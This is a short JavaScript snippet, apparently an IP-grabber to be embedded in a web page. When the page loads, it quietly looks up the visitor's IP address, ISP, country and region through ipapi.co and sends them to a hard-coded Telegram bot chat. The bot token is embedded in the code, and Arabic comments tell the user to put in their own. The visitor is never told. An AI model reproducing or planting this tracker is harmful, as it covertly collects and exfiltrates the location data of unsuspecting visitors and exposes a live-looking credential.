window.onload = function() {
    fetch('https://ipapi.co/json')
        .then(response => response.json())
        .then(data => {
            var ip = data.ip;
            var isp = data.org;
            var country = data.country_name;
            var city = data.region;
            var message = `IP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}`;
            sendTelegramMessage(message);
        })
        .catch(error => {
            console.error("Error fetching IP data:", error);
        });
};

function sendTelegramMessage(message) {
    var chatId = '1045091647'; // استبدل بمعرف الدردشة الخاص بك
    var botToken = '6268789988:AAFslFmhzIT8m4uGpdZgarfvicJrciJ_vg0'; // استبدل برمز الروبوت الخاص بك

    var xhr = new XMLHttpRequest();
    xhr.open('GET', `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, true);
    xhr.send();
}
